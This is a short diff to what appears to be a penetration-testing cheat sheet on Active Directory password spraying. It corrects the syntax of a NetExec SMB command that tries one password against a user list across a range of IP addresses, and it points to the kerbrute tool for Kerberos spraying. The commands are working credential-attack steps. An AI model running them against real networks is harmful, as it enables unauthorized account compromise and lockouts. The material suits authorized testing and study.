@@ -15,7 +15,7 @@ nxc smb $(ANY_DOMAIN_JOINED_MACHINE_IP) -u users.txt -p 'Nexus123!' -d $(DOMAIN)
 ```
 Spray multiple targets at once:
 ```bash
-nxc smb -t 192.168.182.70-76 -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
+nxc smb 192.168.182.70-76 -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
 ```
 # TGT Password Spraying
 https://github.com/ropnop/kerbrute
